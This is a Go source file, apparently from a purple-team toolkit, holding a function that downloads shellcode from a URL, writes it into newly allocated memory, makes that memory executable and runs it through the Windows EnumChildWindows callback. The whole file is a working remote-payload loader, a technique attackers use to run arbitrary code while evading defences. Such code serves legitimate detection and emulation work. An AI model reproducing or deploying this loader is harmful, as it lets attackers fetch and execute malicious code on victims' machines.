//Some parts borrowed from https://github.com/Ne0nd0g/go-shellcode
package techniques

import (
	"fmt"
	"github.com/sh4hin/GoPurple/helpers"
	"golang.org/x/sys/windows"
  "github.com/lxn/win"
	"log"
	"unsafe"
)

func RunEnumChildWindows(url string) {
	shellcode := helpers.FetchUrl(url)


	const (
		//Windows constants used with Windows API calls
		MEM_COMMIT = 0x1000
		MEM_RESERVE = 0x2000
		PAGE_EXECUTE_READ = 0x20
		PAGE_READWRITE = 0x04
	)

	kernel32 := windows.NewLazySystemDLL("kernel32")

	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")


	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}
	_, _, errRtlMoveMemory :=  RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errRtlMoveMemory != nil && errRtlMoveMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlMoveMemory:\r\n%s", errRtlMoveMemory.Error()))
	}
	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	win.EnumChildWindows(0,addr,0)	
}
